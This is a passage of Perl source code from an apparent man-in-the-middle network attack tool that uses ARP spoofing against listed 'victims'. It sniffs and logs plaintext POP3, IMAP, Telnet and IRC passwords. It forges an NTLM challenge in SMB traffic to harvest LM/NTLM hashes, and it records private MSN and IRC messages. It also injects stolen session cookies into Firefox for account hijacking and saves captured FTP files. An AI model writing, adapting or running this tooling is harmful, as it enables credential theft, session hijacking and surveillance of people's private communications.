                print "$info\nUser: $popuser\nPass: $poppass\n\n";
                if ($logpop3 eq "yes") {
                    open(FH,">>pop3.txt") || print("Error: Cannot write pop3 saving file.\n\n");
				    print FH "$info\nUser: $popuser\nPass: $poppass\n\n";
				    close(FH); 
                }
            }
			$sniffcnt++;
			($popuser, $poppass, $srcpop) = '';
			return;
		}
	}
	# IMAP sniffing
	if ($tcp->{src_port} eq $imap || $tcp->{dest_port} eq $imap) {
		if ($tcp_data =~ /(.*) LOGIN (.*) (.*)/s) {
			$info = "$mac_src --> $mac_dst\n";
			$info .= "$ip->{src_ip}:$tcp->{src_port}  -->  $ip->{dest_ip}:$tcp->{dest_port} (IMAP)";
            $imap_user = trim($2);
            $imap_pass = trim($3);
			if ($debug) { print "[Debug] => Parsing data: $imap_user $imap_pass\n\n"; }
			print "$info\nUsername: $imap_user\nPassword: $imap_pass\n\n";
			if ($logimap eq "yes") {	
				open(imap,">>imap.txt") || print("Error: Cannot write imap saving file.\n\n");
				print imap "$info\nUsername: $imap_user\nPassword: $imap_pass\n\n";
				close(imap); 
			}
			$sniffcnt++;
			return;
		}
	}
	# SMB Sniffing
	if ($tcp->{src_port} eq 139 || $tcp->{dest_port} eq 139 || $tcp->{src_port} eq $smb || $tcp->{dest_port} eq $smb) {
		$smb_command_code = unpack('H*', substr($packet, 62, 1));
		if($smb_command_code == '73') { #Session Setup AndX
			$smb_flags = unpack('H*', substr($packet, 67, 1));
			$smb_flags = pack('H2', $smb_flags);
			$ntlmssp_pos = index(unpack('H*', $packet), '4e544c4d53535000'); #NTLMSSP identifier
			if($ntlmssp_pos > 0) {
				$ntlmssp_pos = $ntlmssp_pos/2;
				$message_type_code = unpack('H*', substr($packet, $ntlmssp_pos+8, 1));
				#Session Setup andX Response, NTLMSSP_CHALLENGE
				if($message_type_code == '02' && ((unpack('B8', $smb_flags) & '10000000') eq '10000000')  && !$flag_fakechall) { 
					$flag_fakechall = 1;
					$fake_chall = '1122334455667788';
					$tcp_data2 = ascii2hex($tcp_data);
					$tcp_data2 =~ s/^(.{142})(.{16})(.*)$/$1$fake_chall$3/;
					$orig_chall = $2;
					$fake_flags = '82';
					$tcp_data2 =~ s/^(.{138})(.{2})(.*)$/$1$fake_flags$3/;
					$packet2 = new Net::RawIP;
					$packet2->set({	ip =>	{	saddr => $ip->{src_ip},
												daddr => $ip->{dest_ip},
												id => $ip->{id},
												ttl => $ip->{ttl},
									},
									tcp =>	{	source => $tcp->{src_port},
												dest => $tcp->{dest_port},
												ack => 1,
												psh => 1,
												seq => $tcp->{seqnum},
												ack_seq => $tcp->{acknum},
												window => $tcp->{winsize},
												data => pack('H*', $tcp_data2)
											}
					});
					$packet2->send();
				}
				#Session Setup andX Request, NTLMSSP_AUTH
				if($message_type_code == '03' && ((unpack('B8', $smb_flags) & '10000000') eq '00000000') && !$flag_auth) { 
					$flag_auth = 1;
					# Lan Manager Response
					$len = unpack('H*', substr($packet, $ntlmssp_pos+12,1));
					$maxlen = unpack('H*', substr($packet, $ntlmssp_pos+14,1));
					$offset = unpack('H*', substr($packet, $ntlmssp_pos+16,1));
					$lm_response  = unpack('H*', substr($packet, $ntlmssp_pos+hex($offset),hex($maxlen)));
					# NTLM Response
					$len = unpack('H*', substr($packet, $ntlmssp_pos+20,1));
					$maxlen = unpack('H*', substr($packet, $ntlmssp_pos+22,1));
					$offset = unpack('H*', substr($packet, $ntlmssp_pos+24,1));
					$ntlm_response  = unpack('H*', substr($packet, $ntlmssp_pos+hex($offset),hex($maxlen)));
					# Target Name
					$len = unpack('H*', substr($packet, $ntlmssp_pos+28,1));
					$maxlen = unpack('H*', substr($packet, $ntlmssp_pos+30,1));
					$offset = unpack('H*', substr($packet, $ntlmssp_pos+32,1));
					$target_name  = unpack('H*', substr($packet, $ntlmssp_pos+hex($offset),hex($maxlen)));
					# User Name
					$len = unpack('H*', substr($packet, $ntlmssp_pos+36,1));
					$maxlen = unpack('H*', substr($packet, $ntlmssp_pos+38,1));
					$offset = unpack('H*', substr($packet, $ntlmssp_pos+40,1));
					$user_name  = unpack('H*', substr($packet, $ntlmssp_pos+hex($offset),hex($maxlen)));
					# Host Name
					$len = unpack('H*', substr($packet, $ntlmssp_pos+44,1));
					$maxlen = unpack('H*', substr($packet, $ntlmssp_pos+46,1));
					$offset = unpack('H*', substr($packet, $ntlmssp_pos+48,1));
					$host_name  = unpack('H*', substr($packet, $ntlmssp_pos+hex($offset),hex($maxlen)));
					$info = "$mac_src --> $mac_dst\n";
					$info .= "$ip->{src_ip}:$tcp->{src_port}  -->  $ip->{dest_ip}:$tcp->{dest_port} (SMB)";
					print "$info\n";
					print "Original NTLM Challenge: $orig_chall\n";
					#print "Fake NTLM Challenge: " . $fake_chall . "\n";
					print "Lan Manager Response: $lm_response\n";
					print "NTLM Response: $ntlm_response\n";
					print "Target Name: " . $target_name .  ":" . hex2ascii($target_name) . ":\n";
					print "User Name: " . $user_name .  ":" . hex2ascii($user_name) . ":\n";
					print "Host Name: " . $host_name .  ":" . hex2ascii($host_name) . ":\n\n";
					if ($logsmb eq "yes") {
                        open(smb,">>smb.txt") || die("Error: Cannot write samba file.\n");
						print smb "$info\n";
						print smb "Original NTLM Challenge: $orig_chall\n";
						#print "Fake NTLM Challenge: " . $fake_chall . "\n";
						print smb "Lan Manager Response: $lm_response\n";
						print smb "NTLM Response: $ntlm_response\n";
						print smb "Target Name: " . $target_name .  ":" . hex2ascii($target_name) . ":\n";
						print smb "User Name: " . $user_name .  ":" . hex2ascii($user_name) . ":\n";
						print smb "Host Name: " . $host_name .  ":" . hex2ascii($host_name) . ":\n\n";
                        close(smb);
                    }
					$sniffcnt++;
					return;
					#print "PACKET HEX :" . unpack('H*', $packet) . ":\n";
				}
			}
		}
	}	
	# Telnet Sniffing from crazy and modified.
	if ($tcp->{src_port} eq "$telnet" || $tcp->{dest_port} eq "$telnet") {
		if ($tcp_data =~ /Login incorrect/) { $flag = 0; }
		if($tcp_data =~ /Last/) { $flag = 3; }
		elsif($tcp_data =~ /login/) {   
			$flag = 1;
			return;
		}
		elsif($tcp_data =~ /Password/) {
			$flag = 2;
			return; 
		}
		if($flag == 1) {
			if($sequence{$tcp->{seqnum}}) { return; }
			else { $sequence{$tcp->{seqnum}} = 1; }
			chomp $tcp_data;
			$username .= $tcp_data;
		}
		if($flag == 2) {
			chomp $tcp_data;
			$password .= $tcp_data;
		}
		if($flag == 3) {
			$info = "$mac_src --> $mac_dst\n";
			$info .= "$ip->{src_ip}:$tcp->{src_port}  -->  $ip->{dest_ip}:$tcp->{dest_port} (Telnet)";
			$auth = "Username: $username\nPassword: $password\n\n";
			print "$info\n";
			print "$auth";
			if ($logtelnet eq "yes") {
                open(telnet,">>telnet.txt") || print("Error: Cannot write telnet saving file.\n\n");
                print telnet "$info\n";
                print telnet "$auth";
                close(telnet); 
			}
			$flag = 0;
			($username, $password) = "";
			$sniffcnt++;
		}
	}
	# MSN Sniffing based on convos sessions
	if ($tcp->{src_port} eq "$msn" || $tcp->{dest_port} eq "$msn") {
		($cal, $from, $ans, $iro) = "";
        if ($tcp_data =~ /\AANS (.*) (.*) (.*)/m) {
            $aans = trim($1);
            @anspl = split(" ", $aans);
            $ans = $anspl[1];
            check4mail($ans, $ip->{src_ip});
            $msntable{$ans} = "$ip->{src_ip}";
            return;
        }
        if ($tcp_data =~ /\AIRO (.*) (.*) (.*) (.*) (.*)/m) {
            $iro = trim($3);
            $iro2 = trim($4);
            if ($iro =~ /\w(@)\w+/s) {
                check4mail($iro, $ip->{src_ip});
                $msntable{$iro} = "$ip->{src_ip}";
                return;
            }
            elsif ($iro2 =~ /\w(@)\w+/s) {
                check4mail($iro, $ip->{src_ip});
                $msntable{$iro} = "$ip->{src_ip}";
                return;
            }
        }	   
		if ( $tcp_data =~ /\AUSR\s\S*\s\S*\s(.*) (.*)/m ) {
            $from = trim($1);
            if ($from =~ /\w(@)\w+/s) {
                check4mail($from, $ip->{dest_ip});
                $msntable{$from} = "$ip->{dest_ip}";
                return;
            }
		}
        if ( $tcp_data =~ /\ACAL (.*) (.*)/m) {
            $tvar = trim($1);
            $cal = trim($2);
            if ($tvar !~ /RINGING/s) {
                check4mail($cal, $ip->{dest_ip});
                $msntable{$cal} = "$ip->{dest_ip}";
            }
            return;
        }        
		if ($tcp_data =~ /X-MMS-IM-Format:\s\S*\s\S*\s\S*\s\S*\s\S*\s*(.*)/smg) {
			$msg = parsehex($1);
			if ($msg && $msg !~ /(MSG)/s) {				
                $info = "$mac_src --> $mac_dst\n";
				$info .= "$ip->{src_ip}:$tcp->{src_port}  -->  $ip->{dest_ip}:$tcp->{dest_port} (MSN)";
                while (($msnusermatch, $msnipmatch) = each(%msntable)) {
                    $msnusermatch = trim($msnusermatch);
                    $msnipmatch = trim($msnipmatch);
                    if ($msnipmatch eq $ip->{src_ip}) { $msnfrom = "$msnusermatch"; }
                    if ($msnipmatch eq $ip->{dest_ip}) { $msnto = "$msnusermatch"; }
                }
                if ($msnfrom && $msnto && $savedmsg ne $msg && $msnto ne $msnfrom) {
                    @months = qw(Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec);
                    ($second, $minute, $hour, $daymonth, $month, $yearset, $days, $dayOfYear, $daysave) = localtime();
                    $year = 1900 + $yearset;
					$daymonth = "0$daymonth" if $daymonth <10;
                    $date = "$year-$months[$month]-$daymonth";
					$minute = "0$minute" if $minute < 10;
					$hour = "0$hour" if $hour <10;
                    $time = "$hour:$minute";
					$iro2 = parsehex($iro2);
                    if ($dumpmsn eq "on") {
					    if ($debug) {
							print "[Debug] => Parsing ANS data: $aans\n";
							print "[Debug] => Parsing IRO2 data: $iro2\n";
							print "[Debug] => Parsing CAL data: $cal\n";
						    print "[Debug] => Parsing MSG data: $msg\n\n";
					    }
					    print "$info\n";
					    print "Date: $date\n";
				        print "Time: $time\n";
				        print "From: $msnfrom\n";
                        print "To: $msnto\n";
                        print "Message: $msg\n\n"; 
                    }   
                    if ($logmsn eq "yes") {
                        $writeconv = "$msnfrom-$msnto.txt";
                        $testconv = "$msnto-$msnfrom.txt";
                        if (-e "msn/$testconv") { $writeconv = $testconv; }
                        open (msn,">>msn/$writeconv") || print("Error: Cannot write msn/$writeconv file.\n\n");
                        print msn "$info\n"; 
                        print msn "Date: $date\n";
                        print msn "Time: $time\n";
                        print msn "From: $msnfrom\n";
                        print msn "To: $msnto\n";
                        print msn "Message: $msg\n\n"; 
                        close(msn); 
                    }
                    $savedmsg = $msg;
					($msnfrom, $msnto, $msg) = "";
                }    
            }
            return;  
        }
    }
	# IRC Sniffing
	if ($tcp->{src_port} eq "$irc" || $tcp->{dest_port} eq "$irc") {
		if ($tcp_data =~ /\APRIVMSG (.*) (.*) (.*)/s) {
			$guess = trim($1);
			if ($guess eq "nickserv" || $guess eq "ns") { $pass = parsehex(trim($3)); }
			return;
		}
		if ($tcp_data =~ /(.*) NOTICE *(.*)/s) {
			$out = trim($2);
			@auth = split(/:/, $out);
			$auth[1] = trim($auth[1]);
			$info = "$mac_src --> $mac_dst\n";
			$info .= "$ip->{src_ip}:$tcp->{src_port}  -->  $ip->{dest_ip}:$tcp->{dest_port} (IRC)";
			@numbers = split(/\./, $ip->{src_ip});
  			$ip_number = pack("C4", @numbers);
  			($name) = (gethostbyaddr($ip_number, 2))[0];
			$name = $ip->{src_ip} if !$name;
			print "$info\nServer: $name\nUser: $auth[0]\nPass: $pass\nOutput: $auth[1]\n\n" 
			unless (($user =~ AUTH) || ($user =~ MODE) || ($pass =~ AUTH) || ($pass =~ MODE) || $pass eq "");
			if ($logirc eq "yes") {
				open(irc,">>irc.txt") || print("Error: Cannot write irc saving file.\n\n");
				print irc "$info\nServer: $name\nUser: $auth[0]\nPass: $pass\nOutput: $auth[1]\n\n" 
				unless (($user =~ AUTH) || ($user =~ MODE) || ($pass =~ AUTH) || ($pass =~ MODE) || $pass eq "");
				close(irc); 
			}
			$pass = "";
			$sniffcnt++;
			return;
		}
		# Convos stuff
		if ($tcp_data =~ /(.*) PRIVMSG (.*)/s) {
			$info = "$mac_src --> $mac_dst\n";
			$info .= "$ip->{src_ip}:$tcp->{src_port}  -->  $ip->{dest_ip}:$tcp->{dest_port} (IRC)";
			$nckinfo = parsehex(trim($1));
			$mschinfo = parsehex(trim($2));
			if ($debug) {
				print "[Debug] => Parsing nckinfo data: $nckinfo\n";
				print "[Debug] => Parsing mschinfo data: $to\n";
			}
			@mschpl = split(":", $mschinfo, 2);
			@numbers = split(/\./, $ip->{src_ip});
  			$ip_number = pack("C4", @numbers);
  			($name) = (gethostbyaddr($ip_number, 2))[0];
			$name = $ip->{src_ip} if !$name;
			if ($nckinfo =~ /!i=/s) { @nckpl = split(/!i=/, $nckinfo); }
			elsif ($nckinfo =~ /!n=/s) { @nckpl = split(/!n=/, $nckinfo); }
			elsif ($nckinfo =~ /n=/s) { @nckpl = split(/n=/, $nckinfo); }
			else { @nckpl = split(/!/, $nckinfo); }
			@months = qw(Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec);
			($second, $minute, $hour, $daymonth, $month, $yearset, $days, $dayOfYear, $daysave) = localtime();
			$year = 1900 + $yearset;
    		$daymonth = "0$daymonth" if $daymonth <10;
            $date = "$year-$months[$month]-$daymonth";
			$minute = "0$minute" if $minute < 10;
	    	$hour = "0$hour" if $hour <10;
			@ipinfo = split('@', $nckpl[1]);
			$time = "$hour:$minute"; 
			$ircmsg = trim($mschpl[1]);
			$nckpl[0] =~ tr/://d;
			$ircmsg =~ tr/-//d;
			$ircmsg =~ tr/+//d;
			if ($debug) {
				print "[Debug] => Parsing nckpl data: $nckpl[0]\n";
				print "[Debug] => Parsing ircmsg data: $ircmsg\n\n";
			}
			$get_ip = gethostbyname($ipinfo[1]);
			$ip_address = ($get_ip) ? inet_ntoa($get_ip) : $ipinfo[1];
			if (($mschpl[0] =~ /(#)/s) && defined($ircmsg)) {
				if ($dumpirc eq "on") {
					print "$info\n";
					print "Server: $name\n";
					print "Channel: $mschpl[0]\n";
					print "Date: $date\n";
					print "Time: $time\n";
					print "IP: $ip_address\n";
					print "Nick: $nckpl[0]\n";
					print "MSG: $ircmsg\n\n"; 
				}
				if ($logirchat eq "yes") {
					$chansave = trim($mschpl[0]);
					$chansave =~ tr/#//d;
					$path = "irc/$name";
					$path2 = "irc/$name/$chansave";
					mkdir("$path");
					mkdir("$path2");
					open(chat,">>$path2/$date.txt") || print("Error: Cannot write $path2/$date.txt\n\n");
					print chat "IP: $ip_address\n";
					print chat "Nick: $nckpl[0]\n";
					print chat "MSG: $ircmsg\n\n"; 
					close (chat); 
				} 
			}
			else {
				if ($dumpirc eq "on" && ($nckpl[0] !~ /nickserv/si) && ($nckpl[0] !~ /ns/si) && ($nckpl[0] !~ /(\/motd)/si)) {
					print "$info\n";
					print "* Private MSG *\n";
					print "Server: $name\n";
					print "Date: $date\n";
					print "Time: $time\n";
					print "MSG From: $nckpl[0]\n";
					print "MSG To: $mschpl[0]\n"; 
					print "MSG: $ircmsg\n\n";
					if ($logirchat eq "yes") {
						$mschpl[0] = trim($mschpl[0]);
						mkdir("irc/private_msg/$date");
						open(msg,">>irc/private_msg/$date/$nckpl[0]-$mschpl[0].txt") || print("Error: Cannot write irc/private_msg/$date/$nckpl[0]-$mschpl[0].txt\n\n");
						print msg "Server: $name\n";
						print msg "Date: $date\n";
						print msg "Time: $time\n";
						print msg "MSG From: $nckpl[0]\n";
						print msg "MSG To: $mschpl[0]\n"; 
						print msg "MSG: $ircmsg\n\n"; 
						close(msg); 
					}	 
				}
			}
			($name, $ircmsg, $nckpl[0], $ip_adress) = "";
			return;
		}
	}
	$saved_data = $tcp_data;
} #End of sniffing

###################################### AUXILIARY FUNCTIONS ####################################
# Function to avoid duplicated pop3/imap logins
sub chkpop {
    ($userchk, $passchk) = @_;
    $popfound = "";
    while (($popusr, $popass) = each(%poptable)) {
        $popusr = trim($popusr); $popass = trim($popass);
        if (($userchk eq $popusr) && ($passchk eq $popass)) { $popfound = 1; }
    }
    if ($popfound ne "yes") { $poptable{$userchk} = $passchk; }
    return $popfound;
}

# Function that checks if we already have an address & stuff
sub check4mail {
    ($mail2chk, $ip2chk) = @_;
    while (($msnuser, $msnip) = each(%msntable)) {
        $msnuser = trim($msnuser);
        $msnip = trim($msnip);
        if ($mail2chk eq $msnuser && $ip2chk ne $msnip) { delete($msntable{$msnuser}); }
    }
}

# Function to check VNC ips
sub checkvncip {
    ($vnc2chk) = @_;
    $i = 0;
    $vncfound = "";
    $vnc2chk = trim($vnc2chk);
    while (($vnkey, $vncip) = each(%vnciptable)) {
        $vncip = trim($vncip);
        if ($vncip eq $vnc2chk) { $vncfound = "yes"; }
        $i++;
    }
    if ($vncfound ne "yes") { $vnciptable{$i} = $vnc2chk; }
    return $vncfound;
}

#Function to put hijacked sessions in firefox 3 only
sub hijacksession {
    $cookok = "no";
    ($hisession, $domain, $hinfo) = @_;
    $hisession =~ tr/;//d;

    if ($domain =~ /www/s) {	
        $domain = $domain;
        $cookok = "yes";	    
    }
    else {
        $domain = ".$domain";
    }
	if (($domain =~ m/\.\w+\.\w+\.\w+/gsi) && $domain !~ m/(mail)|(gmail)|(google)|(www)|(msn)|(hotmail)/si) {
	    $cookok = "no";
	}
	else {
	    $cookok = "yes";
	}
    chomp($cookpath = `find $monsterpath/.mozilla/firefox -name cookies.sqlite`);
    @splses = split(" ", $hisession);
	$dbh = DBI->connect("dbi:SQLite:$cookpath") or die ("ERROR");
	$query_select = $dbh->prepare("SELECT * FROM moz_cookies");
	$query_select->execute();
	if (!$dbconnect) {
		$dbh->{AutoCommit} = false;
		$dbconnect = 1;
	}
    
    if ($cookok eq "yes") {
        foreach $valses (@splses) {
            ($sesname, $sesval) = split(/=/, $valses, 2);
            $notfound = 0;
            $sesmod = 0;
            while ( @row = $query_select->fetchrow_array ) {
                $id = trim($row[0]);
                $vname = trim($row[1]);
                $vvalue = trim($row[2]);
                $ldomain = trim($row[3]);
                $path = trim($row[4]);
                $expire = trim($row[5]);
                $sesval = trim($sesval);
                if ($ldomain eq $domain && $sesname eq $vname && $sesval ne $vvalue) {
                        print "$hinfo\n";
                        print "Detected same cookie domain with different value\n";
                        print "Domain: $domain\n";
                        print "Cookie name: $sesname\n";
                        print "Cookie value: $sesval\n";
                        print "Do you want to insert this new value? [y/n]: ";
                        chomp($inject = <STDIN>);
                        if ($inject =~ /n/si) {
                            print "Cookie not Injected...\t[OK]\n\n";
                        }
                        else {
                            $query_update = $dbh->prepare(qq{ UPDATE moz_cookies SET value = ? WHERE id = ? });
                            $query_update->execute($sesval, $id);
                            $dbh->commit;
                            print "Cookie Value Replaced...\t[OK]\n\n";
							$cookiebox{$i} = $id;
							$i++;
                        }
                        $sesmod = 1;
                        $notfound = 1;
                        return;
                    }
                    if ($ldomain eq $domain && $sesname eq $vname && $sesmod ne 1) {
                        $notfound = 1;
                    }
            }
            if ($notfound ne 1) {
                print "$hinfo\n";
                print "New cookie detected\n";
                print "Domain: $domain\n";
                print "Cookie name: $sesname\n";
                print "Cookie value: $sesval\n";
                print "Do you want to insert this new cookie? [y/n]: ";
                chomp($inject = <STDIN>);
                if ($inject =~ /n/si) {
                    print "Cookie not Injected...\t[OK]\n\n";
                }
                else {
                    $query_insert = $dbh->prepare(qq{ INSERT INTO moz_cookies (name, value, host, path, expiry, lastAccessed, isSecure, isHttpOnly) VALUES (?, ?, ?, ?, ?, ?, ?, ?) });
                    $query_insert->execute($sesname, $sesval, $domain, "/", "1230290210294688", "0", "0", "0");
                    $dbh->commit;
                    print "Cookie Injected...\t[OK]\n\n";
                }
            }
            ($stringses,$sesname,$sesval) = "";
        }
    }
    $rc = $dbh->disconnect();
}

#Function to steal FTP files
sub ftp_file_steal {
    ($file_name, $file_data) = @_;
    if($file_data) {
        open(FH, ">>ftp_files/$file_name") || print("\nError: Cannot open file $file_name: $!\n");
        print FH $file_data;
        close(FH);
    }
}

# SMB Stuff
sub get_smb_command {
	$smb_command{'04'} = 'Close File';
	$smb_command{'25'} = 'Transaction';
	$smb_command{'72'} = 'Negotiate Protocol';
	$smb_command{'73'} = 'Session Setup and X';
	$smb_command{'74'} = 'Logoff and X';
	$smb_command{'75'} = 'Tree Connect and X';
	$smb_command{'a2'} = 'NT Create and X';
	return $smb_command{$_[0]};
}

sub get_nt_status {
	$nt_status{'00000000'} = 'STATUS_SUCCESS';
	$nt_status{'160000c0'} = 'STATUS_MORE_PROCESSING_REQUIRED';
	return $nt_status{$_[0]};
}

sub get_message_type {
	$message_type{'01'} = 'NTLMSSP_NEGOTIATE';
	$message_type{'02'} = 'NTLMSSP_CHALLENGE';
	$message_type{'03'} = 'NTLMSSP_AUTH';
	return $message_type{$_[0]};
}

sub cleanarp {
	$tot_victims = $#victims + 1;
	unlink('trapper.pid');
	Net::Pcap::close($pcap);
	print "\n";
	print "[*] Re-routing Hosts...\n";
	foreach $row_src (@victims) {
		foreach $row_dst (@victims) {
			if($row_src ne $row_dst) { 
				($ip_src, $mac_src) = split(/=/, $row_src);
				($ip_dst, $mac_dst) = split(/=/, $row_dst);
				for ($i = 0; $i < 16; $i++) {
					send_arp_packet($dev, $ip_src, $ip_dst, $mac_src, $mac_dst, 'reply');
				}
			}
		}
	}
	print "[*] Done!\n";;
	print "[*] Dying... bye\n";
	print "[*] Passwords and important info saved: $sniffcnt\n\n";
	#`echo 0 > /proc/sys/net/ipv4/ip_forward`;
	aprcheck();
	exit;
}

sub cleansniff {
    Net::Pcap::stats($pcap, \%stats);
    print "[*] Dying...\n";
    print "[*] Packets Received: $stats{'ps_recv'}\n";
    print "[*] Passwords and important info saved: $sniffcnt\n\n";
    exit;
}

sub read_configuration {

	# Load Configuration
	$i = 0;
	$cfg = new Config::Simple('trapper.conf') or die Config::Simple->error();	
	$ftp = $cfg->param('ports.ftp');
	$telnet = $cfg->param('ports.telnet');
	$smtp = $cfg->param('ports.smtp');
	$imap = $cfg->param('ports.imap');
	$http = $cfg->param('ports.http');
	$pop3 = $cfg->param('ports.pop3');
	$smb = $cfg->param('ports.smb');
	$msn = $cfg->param('ports.msn');
	$irc = $cfg->param('ports.irc');
	$sip = $cfg->param('ports.sip');
	$vnc = $cfg->param('ports.vnc');
	$teamspeak = $cfg->param('ports.teamspeak');
	$httpvalues = $cfg->param('http.values');
	# Load logging configuration
	$logftp = $cfg->param('logging.loghttp');
	$logtelnet = $cfg->param('logging.logtelnet');
	$logsmtp = $cfg->param('logging.logsmtp');
	$logimap = $cfg->param('logging.logimap');
	$loghttp = $cfg->param('logging.loghttp');
	$logcookie = $cfg->param('logging.logcookie');
	$logpop3 = $cfg->param('logging.logpop3');
	$logsmb = $cfg->param('logging.logsmb');
	$logmsn = $cfg->param('logging.logmsn');
	$logirc = $cfg->param('logging.logirc');
	$logirchat = $cfg->param('logging.logirchat');
	$logsip = $cfg->param('logging.logsip');
	$logvnc = $cfg->param('logging.logvnc');
	# Cookie Monster
	$monster = $cfg->param('cookie.monster');
	$monsterpath = $cfg->param('cookie.monsterpath');
	# Split http ports
	@httpports = split(",", $http);
	@http = split(",", $httpvalues);
	foreach $value (@http) {
		$value = trim($value);
		$confields{$i} = $value;
		$i++;
	}
}

# Trim function
sub trim($) {
	$string = shift;
	$string =~ s/^\s+//;
	$string =~ s/\s+$//;
	return $string;
}

# Parse hex stuff
sub parsehex {
    $hex = $_[0];
    $hex =~ tr/+/ /;
    $hex =~ s/%([a-fA-F0-9]{2,2})/chr(hex($1))/eg;
    $hex =~ s/<!--(.|\n)*-->//g;
    return $hex;
}

sub hex2ascii ($) {
	$str = $_[0];
	$str =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
	return $str;
}

sub ascii2hex ($) {
	$str = $_[0];
	$str =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
	return $str;
}

sub dec2hex($) { 
	return sprintf("%lx", $_[0]);
}

1;
